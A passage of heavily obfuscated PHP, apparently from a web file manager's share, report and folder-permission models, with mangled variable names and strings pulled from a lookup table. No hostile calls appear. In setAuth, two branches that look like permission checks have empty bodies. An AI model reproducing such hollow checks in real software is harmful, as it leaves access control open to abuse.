Model($œÊÖÜò[599])->where(array($œÊÖÜò[491] => $¸»ØŸ¸•))->delete(); } $¾Œ²ÊÙ = is_array($¸»ØŸ¸•) ? $¸»ØŸ¸•[1] : array($¸»ØŸ¸•); for ($ŞÁœ¥Ö¹ = 0; $ŞÁœ¥Ö¹ < count($¾Œ²ÊÙ); $ŞÁœ¥Ö¹++) { $º©øÒÕÇ = $this->getInfo($¾Œ²ÊÙ[$ŞÁœ¥Ö¹]); if ($º©øÒÕÇ[$œÊÖÜò[498]] == $œÊÖÜò[87]) { Model($œÊÖÜò[567])->eventShare($º©øÒÕÇ[$œÊÖÜò[406]], $œÊÖÜò[1900]); } if ($º©øÒÕÇ[$œÊÖÜò[496]] == $œÊÖÜò[87]) { Model($œÊÖÜò[567])->eventShare($º©øÒÕÇ[$œÊÖÜò[406]], $œÊÖÜò[1899]); } } return $¾Ú°õ½; } protected function removeBySource($†¨Üô”Æ) { $›÷¢öÌ =& $_SERVER[Ù×¯Ø…]; $§­âƒˆ = array($›÷¢öÌ[421] => array($›÷¢öÌ[422], $†¨Üô”Æ)); $šª” Îš = $this->field($›÷¢öÌ[491])->where($§­âƒˆ)->select(); $šª” Îš = array_to_keyvalue($šª” Îš, $›÷¢öÌ[33], $›÷¢öÌ[491]); if (!$šª” Îš) { return; } $§­âƒˆ = array($›÷¢öÌ[490] => array($›÷¢öÌ[422], $šª” Îš)); $this->where($§­âƒˆ)->delete(); Model($›÷¢öÌ[599])->where($§­âƒˆ)->delete(); } public function listAll($ñ“‡’™û) { $¾ªÕ¾š =& $_SERVER[Ù×¯Ø…]; $Ø»è¸µ¿ = array(); if ($ñ“‡’™û[$¾ªÕ¾š[1580]]) { $Ø»è¸µ¿[$¾ªÕ¾š[1580]] = $ñ“‡’™û[$¾ªÕ¾š[1580]]; } if ($ñ“‡’™û[$¾ªÕ¾š[760]]) { $Ê¤ÎúÜ¤ = $ñ“‡’™û[$¾ªÕ¾š[499]] ? $ñ“‡’™û[$¾ªÕ¾š[499]] : strtotime(date($¾ªÕ¾š[1912])); $Ø»è¸µ¿[$¾ªÕ¾š[194]] = array($¾ªÕ¾š[331], array($ñ“‡’™û[$¾ªÕ¾š[760]], $Ê¤ÎúÜ¤)); } if ($ñ“‡’™û[$¾ªÕ¾š[29]]) { $Ø»è¸µ¿[$ñ“‡’™û[$¾ªÕ¾š[29]]] = 1; } else { $Ø»è¸µ¿[] = array($¾ªÕ¾š[496] => array($¾ªÕ¾š[1008], 0), $¾ªÕ¾š[498] => array($¾ªÕ¾š[1008], 0), $¾ªÕ¾š[1889] => $¾ªÕ¾š[1843]); } if ($ñ“‡’™û[$¾ªÕ¾š[1839]]) { $Ø»è¸µ¿[] = array($¾ªÕ¾š[493] => $ñ“‡’™û[$¾ªÕ¾š[1839]], $¾ªÕ¾š[1479] => array($¾ªÕ¾š[381], "\x25{$ñ“‡’™û[$¾ªÕ¾š[1839]]}\45"), $¾ªÕ¾š[1889] => $¾ªÕ¾š[1843]); } $…’Ô¡úÜ = $this->_makeOrder()->where($Ø»è¸µ¿)->selectPage(20); if (empty($…’Ô¡úÜ[$¾ªÕ¾š[367]])) { return array(); } $this->_listDataApply($…’Ô¡úÜ[$¾ªÕ¾š[367]]); return $…’Ô¡úÜ; } public function listDataApply($´÷‚š) { $this->_listDataApply($´÷‚š); return $´÷‚š; } private function _listDataApply(&$€¥ ŒúË) { $Ì´ŠÖ½° =& $_SERVER[Ù×¯Ø…]; $Öñµìø = array_to_keyvalue($€¥ ŒúË, $Ì´ŠÖ½°[33], $Ì´ŠÖ½°[1580]); $„ÇÇ™Õµ = Model($Ì´ŠÖ½°[541])->userListInfo(array_unique($Öñµìø)); $•»œä“õ = array_to_keyvalue($€¥ ŒúË, $Ì´ŠÖ½°[33], $Ì´ŠÖ½°[406]); $›öšáÚñ = Model($Ì´ŠÖ½°[831])->sourceListInfo($•»œä“õ, !0); foreach ($€¥ ŒúË as $ì´ÉôÈ => &$”äŸÂÌ²) { $µÜ˜µ¸ã = $”äŸÂÌ²[$Ì´ŠÖ½°[1580]]; $”äŸÂÌ²[$Ì´ŠÖ½°[1913]] = $„ÇÇ™Õµ[$µÜ˜µ¸ã] ? $„ÇÇ™Õµ[$µÜ˜µ¸ã] : !1; $§Û‹æû = $”äŸÂÌ²[$Ì´ŠÖ½°[406]]; $”äŸÂÌ²[$Ì´ŠÖ½°[85]] = $›öšáÚñ[$§Û‹æû] ? $›öšáÚñ[$§Û‹æû] : !1; if ($”äŸÂÌ²[$Ì´ŠÖ½°[85]][$Ì´ŠÖ½°[434]] == $Ì´ŠÖ½°[87]) { unset($€¥ ŒúË[$ì´ÉôÈ]); } if ($”äŸÂÌ²[$Ì´ŠÖ½°[85]] != $Ì´ŠÖ½°[191] && !$”äŸÂÌ²[$Ì´ŠÖ½°[85]]) { unset($€¥ ŒúË[$ì´ÉôÈ]); } } unset($”äŸÂÌ²); $€¥ ŒúË = array_values($€¥ ŒúË); } private function _makeOrder($áÛƒÒŸï = '') { $ƒÂÉ³·ò =& $_SERVER[Ù×¯Ø…]; $ı‚ÜÈ§ = array($ƒÂÉ³·ò[194], $ƒÂÉ³·ò[499], $ƒÂÉ³·ò[1902], $ƒÂÉ³·ò[1903]); $åñêÜ— = array($ƒÂÉ³·ò[451] => $ƒÂÉ³·ò[452], $ƒÂÉ³·ò[453] => $ƒÂÉ³·ò[454]); $ôªÃÛ½ì = Input::get($ƒÂÉ³·ò[458], $ƒÂÉ³·ò[7], $ƒÂÉ³·ò[427], $ı‚ÜÈ§); $”›Úä¤Ê = Input::get($ƒÂÉ³·ò[459], $ƒÂÉ³·ò[7], $ƒÂÉ³·ò[1914], array($ƒÂÉ³·ò[1838], $ƒÂÉ³·ò[453])); $”›Úä¤Ê = $åñêÜ—[$”›Úä¤Ê]; $áÛƒÒŸï = $áÛƒÒŸï . "{$ôªÃÛ½ì}\40{$”›Úä¤Ê}"; return $this->order($áÛƒÒŸï); } public function reportAdd($¹ı¿Œš) { $–ª¦©¹Æ =& $_SERVER[Ù×¯Ø…]; $ŠŒèñ«ã = array($–ª¦©¹Æ[491] => $¹ı¿Œš[$–ª¦©¹Æ[491]], $–ª¦©¹Æ[1580] => USER_ID); if (Model($–ª¦©¹Æ[1910])->where($ŠŒèñ«ã)->find()) { return !1; } $–¥Í‡£ë = array($–ª¦©¹Æ[491] => $¹ı¿Œš[$–ª¦©¹Æ[491]], $–ª¦©¹Æ[1479] => $¹ı¿Œš[$–ª¦©¹Æ[1479]], $–ª¦©¹Æ[406] => $¹ı¿Œš[$–ª¦©¹Æ[406]], $–ª¦©¹Æ[470] => $¹ı¿Œš[$–ª¦©¹Æ[470]], $–ª¦©¹Æ[1580] => USER_ID, $–ª¦©¹Æ[29] => $¹ı¿Œš[$–ª¦©¹Æ[29]], $–ª¦©¹Æ[454] => $¹ı¿Œš[$–ª¦©¹Æ[454]]); return Model($–ª¦©¹Æ[1910])->add($–¥Í‡£ë); } public function reportList($à¿–÷îÖ) { $µƒ²ù©­ =& $_SERVER[Ù×¯Ø…]; $¹Î…¡Öı = array(); if ($à¿–÷îÖ[$µƒ²ù©­[760]]) { $‡Ù³é® = $à¿–÷îÖ[$µƒ²ù©­[499]] ? $à¿–÷îÖ[$µƒ²ù©­[499]] : strtotime(date($µƒ²ù©­[1912])); $¹Î…¡Öı[$µƒ²ù©­[194]] = array($µƒ²ù©­[331], array($à¿–÷îÖ[$µƒ²ù©­[760]], $‡Ù³é®)); } if (isset($à¿–÷îÖ[$µƒ²ù©­[29]]) && in_array($à¿–÷îÖ[$µƒ²ù©­[29]], array($µƒ²ù©­[87], $µƒ²ù©­[438], $µƒ²ù©­[1915], $µƒ²ù©­[1916], $µƒ²ù©­[1917]))) { $¹Î…¡Öı[$µƒ²ù©­[29]] = $à¿–÷îÖ[$µƒ²ù©­[29]]; } if (isset($à¿–÷îÖ[$µƒ²ù©­[749]]) && in_array($à¿–÷îÖ[$µƒ²ù©­[749]], array($µƒ²ù©­[191], $µƒ²ù©­[87], $µƒ²ù©­[438], $µƒ²ù©­[1915]))) { $¹Î…¡Öı[$µƒ²ù©­[749]] = $à¿–÷îÖ[$µƒ²ù©­[749]]; } $Åã‰¥ê– = Input::get($µƒ²ù©­[459], $µƒ²ù©­[7], $µƒ²ù©­[1914], array($µƒ²ù©­[1838], $µƒ²ù©­[453])); $­¡‚âû½ = array($µƒ²ù©­[451] => $µƒ²ù©­[452], $µƒ²ù©­[453] => $µƒ²ù©­[454]); $ß²İ‹Ğù = $µƒ²ù©­[1918] . $­¡‚âû½[$Åã‰¥ê–]; $¿’¤˜æ = Model($µƒ²ù©­[1910])->where($¹Î…¡Öı)->order($ß²İ‹Ğù)->selectPage(20); if (empty($¿’¤˜æ[$µƒ²ù©­[367]])) { return array(); } $ÒêÄ™é = array_to_keyvalue_group($¿’¤˜æ[$µƒ²ù©­[367]], $µƒ²ù©­[749], $µƒ²ù©­[491]); if (!empty($ÒêÄ™é[0])) { $à¿–÷îÖ = $ÒêÄ™é[0]; $¹Î…¡Öı = array($µƒ²ù©­[491] => array($µƒ²ù©­[7], $à¿–÷îÖ)); $˜•µÓµÑ = $this->where($¹Î…¡Öı)->field($µƒ²ù©­[491])->select(); $˜•µÓµÑ = array_to_keyvalue($˜•µÓµÑ, $µƒ²ù©­[33], $µƒ²ù©­[491]); $ëÛëÄ©£ = array_diff($à¿–÷îÖ, $˜•µÓµÑ); if (!empty($ëÛëÄ©£)) { foreach ($¿’¤˜æ[$µƒ²ù©­[367]] as $¤»§¼æ® => $¯¶óÏô) { if (in_array($¯¶óÏô[$µƒ²ù©­[491]], $ëÛëÄ©£)) { unset($¿’¤˜æ[$µƒ²ù©­[367]][$¤»§¼æ®]); } } } } $this->_listDataApply($¿’¤˜æ[$µƒ²ù©­[367]]); return $¿’¤˜æ; } public function reportStatus($Óå’Ú¼) { $¾…“Óè÷ =& $_SERVER[Ù×¯Ø…]; $¢˜Ë˜â¤ = array($¾…“Óè÷[395] => $Óå’Ú¼[$¾…“Óè÷[395]]); $úÇôİ£— = Model($¾…“Óè÷[1910])->where($¢˜Ë˜â¤)->field($¾…“Óè÷[1919])->find(); if (!$úÇôİ£—) { return !1; } $ØÁ…­ßû = array($¾…“Óè÷[749] => $Óå’Ú¼[$¾…“Óè÷[749]]); if ($Óå’Ú¼[$¾…“Óè÷[749]] == $¾…“Óè÷[1915] && $úÇôİ£—[$¾…“Óè÷[749]] == $¾…“Óè÷[1915]) { $ØÁ…­ßû[$¾…“Óè÷[749]] = 0; } $ìÌ—¡±ˆ = Model($¾…“Óè÷[1910])->where($¢˜Ë˜â¤)->save($ØÁ…­ßû); if ($Óå’Ú¼[$¾…“Óè÷[749]] == $¾…“Óè÷[438]) { if ($úÇôİ£—[$¾…“Óè÷[470]] != $¾…“Óè÷[191] && $this->shareFileMeta($úÇôİ£—[$¾…“Óè÷[470]])) { $this->shareFileMeta($úÇôİ£—[$¾…“Óè÷[470]], 0); } $this->remove($úÇôİ£—[$¾…“Óè÷[491]]); return !0; } if ($ìÌ—¡±ˆ && $Óå’Ú¼[$¾…“Óè÷[749]] == $¾…“Óè÷[1915]) { $‘ÚÑÛ÷Ş = $ØÁ…­ßû[$¾…“Óè÷[749]] == $¾…“Óè÷[1915] ? 1 : 0; $this->shareFileMeta($úÇôİ£—[$¾…“Óè÷[470]], $‘ÚÑÛ÷Ş); $this->removeByFile($úÇôİ£—[$¾…“Óè÷[470]]); } return $ìÌ—¡±ˆ; } private function removeByFile($£«Ä¤êé) { $¥œÄ–‚â =& $_SERVER[Ù×¯Ø…]; $ßÜóÈâ = Model($¥œÄ–‚â[831])->where(array($¥œÄ–‚â[470] => $£«Ä¤êé))->field($¥œÄ–‚â[406])->select(); $®ª£çÉ = array_to_keyvalue($ßÜóÈâ, $¥œÄ–‚â[33], $¥œÄ–‚â[406]); $î­Ã´‚ô = array($¥œÄ–‚â[406] => array($¥œÄ–‚â[7], $®ª£çÉ), $¥œÄ–‚â[496] => 1); $ßÜóÈâ = $this->where($î­Ã´‚ô)->field($¥œÄ–‚â[491])->select(); if (empty($ßÜóÈâ)) { return; } $åĞÔşš˜ = array_to_keyvalue($ßÜóÈâ, $¥œÄ–‚â[33], $¥œÄ–‚â[491]); $this->remove($åĞÔşš˜); } private function shareFileMeta($Õûµ‰Àó, $ğÅùä‘è = null) { $±Ù­¢áŠ =& $_SERVER[Ù×¯Ø…]; $¼ÅìîÆ¯ = array($±Ù­¢áŠ[470] => $Õûµ‰Àó, $±Ù­¢áŠ[93] => $±Ù­¢áŠ[1920]); if (is_null($ğÅùä‘è)) { return Model($±Ù­¢áŠ[1921])->where($¼ÅìîÆ¯)->find(); } $¼ÅìîÆ¯[$±Ù­¢áŠ[372]] = $ğÅùä‘è; Model($±Ù­¢áŠ[1921])->add($¼ÅìîÆ¯, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\x72\x63\x65\137\x61\165\x74\150"; public function getAuth($Îç×–«ê) { $ù­ŞÌÛ´ =& $_SERVER[Ù×¯Ø…]; $ñ¤âøÜù = $this->sourceAuthSelect($Îç×–«ê); $»ĞÒº¯ = array(); $“ª¹îã¦ = array(); $çåà©òÑ = 2 << 25; foreach ($ñ¤âøÜù as $†°œ²­¶) { $ø½œÆ = Model($ù­ŞÌÛ´[510])->listData($†°œ²­¶[$ù­ŞÌÛ´[1851]]); if (!$ø½œÆ) { continue; } $»ĞÒº¯[] = $†°œ²­¶; $›óÈ€íÃ = 0; if ($†°œ²­¶[$ù­ŞÌÛ´[415]] == SourceModel::TYPE_GROUP) { $›óÈ€íÃ = $çåà©òÑ * 2; } if ($†°œ²­¶[$ù­ŞÌÛ´[415]] == SourceModel::TYPE_USER) { $›óÈ€íÃ = $çåà©òÑ; } if ($†°œ²­¶[$ù­ŞÌÛ´[415]] == SourceModel::TYPE_USER && $†°œ²­¶[$ù­ŞÌÛ´[507]] == $ù­ŞÌÛ´[191]) { $›óÈ€íÃ = 0; } $“ª¹îã¦[] = $ø½œÆ[$ù­ŞÌÛ´[417]] + $›óÈ€íÃ; } array_multisort($“ª¹îã¦, SORT_DESC, $»ĞÒº¯); return $»ĞÒº¯; } public function sourceAuthSelect($•ê‰ËæÛ) { $åüèªöÆ =& $_SERVER[Ù×¯Ø…]; static $íµõÚ†£ = array(); $ç¾Á¾‡‰ = is_array($•ê‰ËæÛ) ? !1 : !0; if ($ç¾Á¾‡‰) { $•ê‰ËæÛ = array($•ê‰ËæÛ); } $©‚ê¦Úº = array(); foreach ($•ê‰ËæÛ as $éóéÀâì) { if (isset($íµõÚ†£[$éóéÀâì])) { $©‚ê¦Úº[$éóéÀâì] = $íµõÚ†£[$éóéÀâì]; } } if (count($©‚ê¦Úº) == count($•ê‰ËæÛ)) { return $ç¾Á¾‡‰ ? $©‚ê¦Úº[$•ê‰ËæÛ[0]] : $©‚ê¦Úº; } $í¯±˜«¡ = $åüèªöÆ[1922]; $µÌ‡ÓúÜ = array($åüèªöÆ[406] => array($åüèªöÆ[7], $•ê‰ËæÛ)); $§œÊüµ = $this->field($í¯±˜«¡)->order($åüèªöÆ[395])->where($µÌ‡ÓúÜ)->select(); $şÁıÖÏ– = array_to_keyvalue_group($§œÊüµ, $åüèªöÆ[406]); foreach ($•ê‰ËæÛ as $éóéÀâì) { $íµõÚ†£[$éóéÀâì] = $şÁıÖÏ–[$éóéÀâì] ? $şÁıÖÏ–[$éóéÀâì] : array(); } if ($ç¾Á¾‡‰) { return $§œÊüµ; } return $şÁıÖÏ–; } public function setAuth($ñ˜ëäÅ, $Êœ±Úâ“) { $êÉœÔ€ =& $_SERVER[Ù×¯Ø…]; $ùÌ•À– = Model($êÉœÔ€[1253])->sourceInfo($ñ˜ëäÅ); if (!$ùÌ•À–) { return !1; } if ($ùÌ•À–[$êÉœÔ€[415]] != SourceModel::TYPE_GROUP) { return !1; } $“÷¢¸¥© = 1; $ˆµù·Ç = $ùÌ•À–[$êÉœÔ€[507]]; if ($ˆµù·Ç != $“÷¢¸¥©) { $æ…ÖäĞú = array($êÉœÔ€[1748] => $ˆµù·Ç); $ÊçÒ€—Ã = Model($êÉœÔ€[1837])->field($êÉœÔ€[1580])->where($æ…ÖäĞú)->select(); $ÊçÒ€—Ã = array_to_keyvalue($ÊçÒ€—Ã, $êÉœÔ€[33], $êÉœÔ€[1580]); } $Ç’šÈ±Õ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¹çò®ñ = array(); foreach ($Êœ±Úâ“ as $¼šŞ¸› ) { if (!in_array($¼šŞ¸› [$êÉœÔ€[415]], $Ç’šÈ±Õ)) { show_json(LNG($êÉœÔ€[1923]), !1); } if ($ˆµù·Ç != $“÷¢¸¥©) { if ($¼šŞ¸› [$êÉœÔ€[415]] == SourceModel::TYPE_GROUP) { } if ($¼šŞ¸› [$êÉœÔ€[507]] != 0 && !in_array($¼šŞ¸› [$êÉœÔ€[507]], $ÊçÒ€—Ã)) { } } if ($¼šŞ¸› [$êÉœÔ€[507]] == 0) { $¼šŞ¸› [$êÉœÔ€[415]] = SourceModel::TYPE_USER; } $¹çò®ñ[] = array($êÉœÔ€[406] => $ñ˜ëäÅ, $êÉœÔ€[415] => intval($¼šŞ¸› [$êÉœÔ€[415]]), $êÉœÔ€[507] => intval($¼šŞ¸› [$êÉœÔ€[507]]), $êÉœÔ€[1851] => intval($¼šŞ¸› [$êÉœÔ€[1851]]) ? intval($¼šŞ¸› [$êÉœÔ€[1851]]) : 0, $êÉœÔ€[1905] => intval($¼šŞ¸› [$êÉœÔ€[1905]]) ? intval($¼šŞ¸› [$êÉœÔ€[1905]]) : -1); } $this->where(array($êÉœÔ€[421] => $ñ˜ëäÅ))->delete(); $this->addAll($¹çò®ñ); return !0; } public function authClear($Ç«şõĞ—) { $ìÌóÄšÖ =& $_SERVER[Ù×¯Ø…]; $¹ú¼ÂëÎ = Model($ìÌóÄšÖ[1253])->sourceInfo($Ç«şõĞ—); $Ä×Ò¯“ = array($Ç«şõĞ—); if ($¹ú¼ÂëÎ[$ìÌóÄšÖ[414]] == $ìÌóÄšÖ[87]) { $‰ïö˜‹ = array($ìÌóÄšÖ[587] => array($ìÌóÄšÖ[547], $¹ú¼ÂëÎ[$ìÌóÄšÖ[524]] . $Ç«şõĞ— . $ìÌóÄšÖ[548])); $Ä×Ò¯“ = Model($ìÌóÄšÖ[1253])->field($ìÌóÄšÖ[421])->where($‰ïö˜‹)->getField($ìÌóÄšÖ[406], !0); $Ä×Ò¯“[] = $Ç«şõĞ—; } $this->where(array($ìÌóÄšÖ[421] => array($ìÌóÄšÖ[422], $Ä×Ò¯“)))->delete(); return !0; } public function getAllChildren($ÊÍ”õÇÕ) { $¾ĞË”İÜ =& $_SERVER[Ù×¯Ø…]; $¥ïÙ¸‡‡ = Model($¾ĞË”İÜ[1253])->sourceInfo($ÊÍ”õÇÕ); if ($¥ïÙ¸‡‡[$¾ĞË”İÜ[414]] != $¾ĞË”İÜ[87]) { return $this->sourceListAuth(array($ÊÍ”õÇÕ)); } if ($¥ïÙ¸‡‡[$¾ĞË”İÜ[415]] != SourceModel::TYPE_GROUP) { return array(); } $î¬ĞàÏ‹ = 1; $ÆÛãˆ„û = array($ÊÍ”õÇÕ); if ($¥ïÙ¸‡‡[$¾ĞË”İÜ[501]] == $¾ĞË”İÜ[191] && $¥ïÙ¸‡‡[$¾ĞË”İÜ[507]] != $î¬ĞàÏ‹) { $ÆÛãˆ„û = $this->groupChidldAllRootSource($¥ïÙ¸‡‡[$¾ĞË”İÜ[507]]); } $’ççÄÖ = $this->field($¾ĞË”İÜ[406])->group($¾ĞË”İÜ[406])->select(); $’ççÄÖ = array_to_keyvalue($’ççÄÖ, $¾ĞË”İÜ[33], $¾ĞË”İÜ[406]); if (!$’ççÄÖ) { return array(); } $‘ƒÆñÄø = $¾ĞË”İÜ[1924]; $Š²ÚúÙæ = array($¾ĞË”İÜ[406] => array($¾ĞË”İÜ[7], $’ççÄÖ), $¾ĞË”İÜ[434] => $¾ĞË”İÜ[191]); $¹¾³İª™ = Model($¾ĞË”İÜ[831])->field($‘ƒÆñÄø)->where($Š²ÚúÙæ)->select(); $ş”İ· É = array($ÊÍ”õÇÕ); foreach ($¹¾³İª™ as $İÍİÎüí) { foreach ($ÆÛãˆ„û as $ÖÕŸ±áÜ) { $‚‰©©‡ö = $¾ĞË”İÜ[47] . $ÖÕŸ±áÜ . $¾ĞË”İÜ[47]; $•úèß®´ = $İÍİÎüí[$¾ĞË”İÜ[524]] . $İÍİÎüí[$¾ĞË”İÜ[406]] . $¾ĞË”İÜ[47]; if (strstr($•úèß®´, $‚‰©©‡ö)) { $ş”İ· É[] = $İÍİÎüí[$¾ĞË”İÜ[406]]; break; } } } return $this->sourceListAuth($ş”İ· É); } private function sourceListAuth($¥œËÅàî) { $Ê™›Óí´ =& $_SERVER[Ù×¯Ø…]; $šÛˆ¾¬À = Model($Ê™›Óí´[1253])->sourceListInfo($¥œËÅàî, !0); $ÚİÁÚù’ = $this->sourceAuthSelect($¥œËÅàî); $Ş¬¯ïƒ‡ = array(); $‚ÃáÔ– = array(); foreach ($šÛˆ¾¬À as $¿ÈÔœöé) { unset($¿ÈÔœöé[$Ê™›Óí´[457]]); unset($¿ÈÔœöé[$Ê™›Óí´[455]]); unset($¿ÈÔœöé[$Ê™›Óí´[417]]); unset($¿ÈÔœöé[$Ê™›Óí´[85]]); $•§ŞÈ÷Õ = $ÚİÁÚù’[$¿ÈÔœöé[$Ê™›Óí´[406]]]; if (!$•§ŞÈ÷Õ) { continue; } $¿ÈÔœöé[$Ê™›Óí´[1925]] = $this->authTargetInfo($•§ŞÈ÷Õ); $¿ÈÔœöé[$Ê™›Óí´[522]] = rtrim($¿ÈÔœöé[$Ê™›Óí´[528]], $Ê™›Óí´[8]) . $Ê™›Óí´[8] . ltrim($¿ÈÔœöé[$Ê™›Óí´[522]], $Ê™›Óí´[8]); $Ş¬¯ïƒ‡[] = $¿ÈÔœöé; $ÖØ·µÔ = count(explode($Ê™›Óí´[8], trim($¿ÈÔœöé[$Ê™›Óí´[522]], $Ê™›Óí´[8]))); $‚ÃáÔ–[] = $ÖØ·µÔ + ($¿ÈÔœöé[$Ê™›Óí´[29]] == $Ê™›Óí´[77] ? 0 : 1000); } array_multisort($‚ÃáÔ–, SORT_ASC, $Ş¬¯ïƒ‡); return $Ş¬¯ïƒ‡; } private function groupChidldAllRootSource($Ú£–¹) { $£±ƒÈ” =& $_SERVER[Ù×¯Ø…]; $¯¹°µö¥ = Model($£±ƒÈ”[1926])->groupChildrenAll($Ú£–¹); $¾Ü’™™ = array($£±ƒÈ”[501] => 0, $£±ƒÈ”[507] => array($£±ƒÈ”[7], $¯¹°µö¥), $£±ƒÈ”[415] => SourceModel::TYPE_GROUP); $‡‚Á™ï = Model($£±ƒÈ”[831])->field($£±ƒÈ”[406])->where($¾Ü’™™)->select(); $‡‚Á™ï = array_to_keyvalue($‡‚Á™ï, $£±ƒÈ”[33], $£±ƒÈ”[406]); return $‡‚Á™ï; } private function authTargetInfo($¹×şöáò) { $‹’Ë¿© =& $_SERVER[Ù×¯Ø…]; $Ÿ«îˆş = array(); $¯Æëà•¾ = array(); $ÌÉÒÆà˜ = 2 << 25; foreach ($¹×şöáò as $Ïı¾Şµâ) { $­ÜÍƒª÷ = Model($‹’Ë¿©[510])->listData($Ïı¾Şµâ[$‹’Ë¿©[1851]]); if (!$­ÜÍƒª÷) { continue; } if ($Ïı¾Şµâ[$‹’Ë¿©[415]] == SourceModel::TYPE_USER) { $¢°à“ÂÛ = Model($‹’Ë¿©[516])->getInfoSimpleOuter($Ïı¾Şµâ[$‹’Ë¿©[507]]); if ($¢°à“ÂÛ[$‹’Ë¿©[1580]] == $‹’Ë¿©[1120]) { continue; } if ($¢°à“ÂÛ[$‹’Ë¿©[1580]] == $‹’Ë¿©[191]) { $¢°à“ÂÛ[$‹’Ë¿©[28]] = LNG($‹’Ë¿©[1927]); } } else { $¢°à“ÂÛ = Model($‹’Ë¿©[525])->getInfoSimple($Ïı¾Şµâ[$‹’Ë¿©[507]]); } if (!$¢°à“ÂÛ) { continue; } $¢°à“ÂÛ[$‹’Ë¿©[469]] = $­ÜÍƒª÷; $Ÿ«îˆş[] = $¢°à“ÂÛ; $Ãã®×¢ñ = 0; if ($Ïı¾Şµâ[$‹’Ë¿©[415]] == SourceModel::TYPE_GROUP) { $Ãã®×¢ñ = $ÌÉÒÆà˜ * 2; } if ($Ïı¾Şµâ[$‹’Ë¿©[415]] == SourceModel::TYPE_USER) { $Ãã®×¢ñ = $ÌÉÒÆà˜; } if ($Ïı¾Şµâ[$‹’Ë¿©[415]] == SourceModel::TYPE_USER && $Ïı¾Şµâ[$‹’Ë¿©[507]] == $‹’Ë¿©[191]) { $Ãã®×¢ñ = 0; } $¯Æëà•¾[] = $­ÜÍƒª÷[$‹’Ë¿©[417]] + $Ãã®×¢ñ; } array_multisort($¯Æëà•¾, SORT_DESC, $Ÿ«îˆş); return $Ÿ«îˆş; } public function getAllChildrenByUser($õï§Ì‚, $Á…û«ı) { $×·ÎÄßÚ =& $_SERVER[Ù×¯Ø…]; $Í¹é©¯ù = Model($×·ÎÄßÚ[541])->getInfo($Á…û«ı); if (!$Á…û«ı || !$õï§Ì‚ || !$Í¹é©¯ù) { return array(); } $¶Ó€ÅÀò = Model($×·ÎÄßÚ[1253])->sourceInfo($õï§Ì‚); $ìĞ³¿Ö = array(); $ßÈ×ŞÆ = 1; if ($¶Ó€ÅÀò[$×·ÎÄßÚ[501]] == $×·ÎÄßÚ[191] && $¶Ó€ÅÀò[$×·ÎÄßÚ[507]] != $ßÈ×ŞÆ && $this->groupContainUser($¶Ó€ÅÀò[$×·ÎÄßÚ[507]], $Á…û«ı)) { foreach ($Í¹é©¯ù[$×·ÎÄßÚ[1928]] as $¶Í°Ä£¾) { $¸Ğèèˆ = Model($×·ÎÄßÚ[525])->getInfo($¶Í°Ä£¾[$×·ÎÄßÚ[1748]]); $§ïŒßŸŠ = Model($×·ÎÄßÚ[541])->getInfoSimpleOuter($Á…û«ı); $§ïŒßŸŠ[$×·ÎÄßÚ[469]] = $¶Í°Ä£¾[$×·ÎÄßÚ[417]]; if (Model($×·ÎÄßÚ[510])->authCheckAction($¶Í°Ä£¾[$×·ÎÄßÚ[417]][$×·ÎÄßÚ[417]], $×·ÎÄßÚ[1768])) { continue; } $ñóÄºœŠ = array($×·ÎÄßÚ[28] => $×·ÎÄßÚ[1529] . $¸Ğèèˆ[$×·ÎÄßÚ[28]], $×·ÎÄßÚ[406] => $¸Ğèèˆ[$×·ÎÄßÚ[85]][$×·ÎÄßÚ[406]], $×·ÎÄßÚ[76] => KodIO::make($¸Ğèèˆ[$×·ÎÄßÚ[85]][$×·ÎÄßÚ[406]]), $×·ÎÄßÚ[501] => $×·ÎÄßÚ[191], $×·ÎÄßÚ[415] => $×·ÎÄßÚ[518], $×·ÎÄßÚ[29] => $×·ÎÄßÚ[551], $×·ÎÄßÚ[522] => $¸Ğèèˆ[$×·ÎÄßÚ[529]], $×·ÎÄßÚ[1748] => $¸Ğèèˆ[$×·ÎÄßÚ[1748]], $×·ÎÄßÚ[526] => $¸Ğèèˆ[$×·ÎÄßÚ[501]], $×·ÎÄßÚ[1925] => array($§ïŒßŸŠ)); $ìĞ³¿Ö[$ñóÄºœŠ[$×·ÎÄßÚ[406]]] = $ñóÄºœŠ; } } $ŞªÔ†çµ = array(); $¯õÀ¤° = $this->getAllChildren($õï§Ì‚); foreach ($¯õÀ¤° as $®¨¿õÍÁ) { $‡İÏ’ = !1; foreach ($®¨¿õÍÁ[$×·ÎÄßÚ[1925]] as $Şö®¬¾ñ) { if ($Şö®¬¾ñ[$×·ÎÄßÚ[1580]]) { if ($Şö®¬¾ñ[$×·ÎÄßÚ[1580]] == $Á…û«ı) { $‡İÏ’ = !0; break; } } if ($Şö®¬¾ñ[$×·ÎÄßÚ[1748]]) { if ($this->groupContainUser($Şö®¬¾ñ[$×·ÎÄßÚ[1748]], $Á…û«ı)) { $‡İÏ’ = !0; break; } } } if ($‡İÏ’) { $ŞªÔ†çµ[] = $®¨¿õÍÁ; } $ÆÈìñÆ = $®¨¿õÍÁ[$×·ÎÄßÚ[406]]; if (isset($ìĞ³¿Ö[$ÆÈìñÆ])) { $®¨¿õÍÁ[$×·ÎÄßÚ[1925]][] = $ìĞ³¿Ö[$ÆÈìñÆ][0]; $ìĞ³¿Ö[$ÆÈìñÆ] = !1; } } $ìĞ³¿Ö = array_filter(array_values($ìĞ³¿Ö)); $ŞªÔ†çµ = array_merge($ìĞ³¿Ö, $ŞªÔ†çµ); return $ŞªÔ†çµ; } public function setAllChildrenByUser($ÖßêÏ„›, $¾ı¸§, $¬¥ş®) { $ï‰·®å =& $_SERVER[Ù×¯Ø…]; $àº¨® = $this->getAllChildrenByUser($ÖßêÏ„›, $¾ı¸§); if (!$¬¥ş® || !$àº¨®) { return !1; } foreach ($àº¨® as $¢’°¸ƒÔ) { $æÈİµÂü = array(); foreach ($¢’°¸ƒÔ[$ï‰·®å[1925]] as $ÜÎª¶´º) { $¸¦ªŞ©ø = $ÜÎª¶´º[$ï‰·®å[469]]; $®ÊÏ¥ÂÓ = $ÜÎª¶´º[$ï‰·®å[1580]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $“ŒÉáç® = $ÜÎª¶´º[$ï‰·®å[1580]] ? $ÜÎª¶´º[$ï‰·®å[1580]] : $ÜÎª¶´º[$ï‰·®å[1748]]; if ($ÜÎª¶´º[$ï‰·®å[1580]] && $ÜÎª¶´º[$ï‰·®å[1580]] == 